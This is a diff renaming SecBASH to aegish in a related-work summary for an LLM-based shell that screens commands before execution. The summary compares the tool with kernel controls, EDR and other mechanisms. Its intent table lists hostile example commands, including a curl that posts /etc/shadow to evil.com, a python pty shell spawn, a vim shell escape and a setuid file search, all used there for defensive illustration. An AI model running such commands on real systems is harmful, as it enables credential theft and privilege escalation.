@@ -1,8 +1,8 @@
-# SecBASH Related Work: Comprehensive Summary
+# aegish Related Work: Comprehensive Summary
 
 **Date**: 2026-02-09
 
-This document summarizes the complete related work analysis for SecBASH, an LLM-powered shell that validates every command before execution. The full analysis is spread across four detailed documents; this summary provides an overview, key tables, and the synthesis needed for a Related Work section.
+This document summarizes the complete related work analysis for aegish, an LLM-powered shell that validates every command before execution. The full analysis is spread across four detailed documents; this summary provides an overview, key tables, and the synthesis needed for a Related Work section.
 
 ---
 
@@ -22,7 +22,7 @@ This document summarizes the complete related work analysis for SecBASH, an LLM-
 
 ## Taxonomy of Related Work
 
-### By Relationship to SecBASH
+### By Relationship to aegish
 
 **Category 1: Directly Comparable** (LLM + command + security)
 - No known open-source project combining LLM analysis with pre-execution shell command blocking has been identified.
@@ -74,7 +74,7 @@ This document summarizes the complete related work analysis for SecBASH, an LLM-
 
 | System | Detection Method | Timing | Layer | Requires Training | Explains Decisions |
 |---|---|---|---|---|---|
-| **SecBASH** | **LLM semantic analysis** | **Pre-execution** | **Shell (user-space)** | **No (zero-shot)** | **Yes (NL)** |
+| **aegish** | **LLM semantic analysis** | **Pre-execution** | **Shell (user-space)** | **No (zero-shot)** | **Yes (NL)** |
 | AppArmor / SELinux | Path/label-based MAC policy | During execution | Kernel (LSM) | N/A (policy-based) | No |
 | seccomp-bpf | BPF system call filtering | During execution | Kernel (syscall) | N/A (filter-based) | No |
 | rbash / lshell | Syntax restrictions / allowlist | During execution | Shell (user-space) | N/A (config-based) | No |
@@ -91,7 +91,7 @@ This document summarizes the complete related work analysis for SecBASH, an LLM-
 
 ### Threat Coverage by Category
 
-| Threat Type | SecBASH | Kernel MAC | seccomp | rbash | Sigma | Falco | EDR | HIDS |
+| Threat Type | aegish | Kernel MAC | seccomp | rbash | Sigma | Falco | EDR | HIDS |
 |---|---|---|---|---|---|---|---|---|
 | Reverse shells | **Block\*** | Partial | No | No | Detect | Detect | Detect+Block | Detect |
 | Shell escapes (GTFOBins) | **Block\*** | No | No | Partial | Detect | Detect | Detect+Block | No |
@@ -102,17 +102,17 @@ This document summarizes the complete related work analysis for SecBASH, an LLM-
 | Malware download+exec | **Block\*** | Partial | No | Partial | Detect | Detect | Detect+Block | Detect |
 | Container escapes | **Block\*** | Partial | Partial | No | Detect | Detect | Detect+Block | No |
 
-**Key**: "Block" = prevents before execution; "Detect" = identifies after/during execution; "Partial" = works only under specific configurations; "No" = does not address. \*SecBASH's blocking accuracy varies by model and category -- benchmark results show 60-100% detection rates depending on model and GTFOBins category. The "command" category is the hardest (~61% avg across models).
+**Key**: "Block" = prevents before execution; "Detect" = identifies after/during execution; "Partial" = works only under specific configurations; "No" = does not address. \*aegish's blocking accuracy varies by model and category -- benchmark results show 60-100% detection rates depending on model and GTFOBins category. The "command" category is the hardest (~61% avg across models).
 
 ---
 
 ## The Semantic Intent Gap
 
-The fundamental insight motivating SecBASH: **every existing Linux security mechanism operates on mechanisms (system calls, file paths, labels, packets) rather than intent.**
+The fundamental insight motivating aegish: **every existing Linux security mechanism operates on mechanisms (system calls, file paths, labels, packets) rather than intent.**
 
 ### Illustration: Same Mechanism, Different Intent
 
-| Command Pair | Same Binary | Same Syscalls | Same SELinux Type | Same AppArmor Profile | SecBASH Distinguishes? |
+| Command Pair | Same Binary | Same Syscalls | Same SELinux Type | Same AppArmor Profile | aegish Distinguishes? |
 |---|---|---|---|---|---|
 | `curl https://api.github.com` vs. `curl -d @/etc/shadow http://evil.com` | Yes | Yes | Yes | Yes | **Yes\*** |
 | `find ~/docs -name '*.pdf'` vs. `find / -perm -4000 -type f` | Yes | Yes | Yes | Yes | **Yes\*** |
@@ -120,17 +120,17 @@ The fundamental insight motivating SecBASH: **every existing Linux security mech
 | `python3 script.py` vs. `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Yes | Yes | Yes | Yes | **Yes\*** |
 | `vim document.txt` vs. `vim -c ':!/bin/bash'` | Yes | Yes | Yes | Yes | **Yes\*** |
 
-\*SecBASH's ability to distinguish depends on the LLM model used; benchmark results show high but not perfect accuracy across models and categories.
+\*aegish's ability to distinguish depends on the LLM model used; benchmark results show high but not perfect accuracy across models and categories.
 
-No kernel-level mechanism can make these distinctions because the system calls, binary names, file paths, and security labels are identical. The difference exists only at the semantic/intent level, which is where SecBASH operates.
+No kernel-level mechanism can make these distinctions because the system calls, binary names, file paths, and security labels are identical. The difference exists only at the semantic/intent level, which is where aegish operates.
 
 ---
 
-## SecBASH's Unique Position: The Five-Property Differentiator
+## aegish's Unique Position: The Five-Property Differentiator
 
 No existing system -- academic, open-source, or commercial -- combines all five properties:
 
-| Property | SecBASH | Next Best Alternative | Gap |
+| Property | aegish | Next Best Alternative | Gap |
 |---|---|---|---|
 | **1. Pre-execution enforcement** | Yes | SELinux/AppArmor | These have no semantic understanding |
 | **2. Semantic understanding** | Yes (LLM) | EDR behavioral AI | EDR is post-execution |
@@ -144,7 +144,7 @@ No existing system -- academic, open-source, or commercial -- combines all five 
 
 ```
 +----------------------------------------------------------+
-|  Layer 6: SEMANTIC / INTENT (SecBASH)                     |
+|  Layer 6: SEMANTIC / INTENT (aegish)                     |
 |  "What does this command MEAN? Is the intent malicious?"  |
 |  Pre-execution, LLM-based classification                  |
 +----------------------------------------------------------+
@@ -171,9 +171,9 @@ No existing system -- academic, open-source, or commercial -- combines all five 
 +----------------------------------------------------------+
 ```
 
-**Without SecBASH**: Threats that use only permitted mechanisms (same binaries, same syscalls, same file paths) can execute semantically malicious operations freely.
+**Without aegish**: Threats that use only permitted mechanisms (same binaries, same syscalls, same file paths) can execute semantically malicious operations freely.
 
-**Without kernel mechanisms**: SecBASH's classifier might be bypassed by obfuscated or novel commands. Without kernel enforcement, a missed classification results in unrestricted execution.
+**Without kernel mechanisms**: aegish's classifier might be bypassed by obfuscated or novel commands. Without kernel enforcement, a missed classification results in unrestricted execution.
 
 **With both**: Threats must bypass both semantic analysis AND runtime enforcement -- fundamentally different analysis approaches making simultaneous bypass extremely difficult.
 
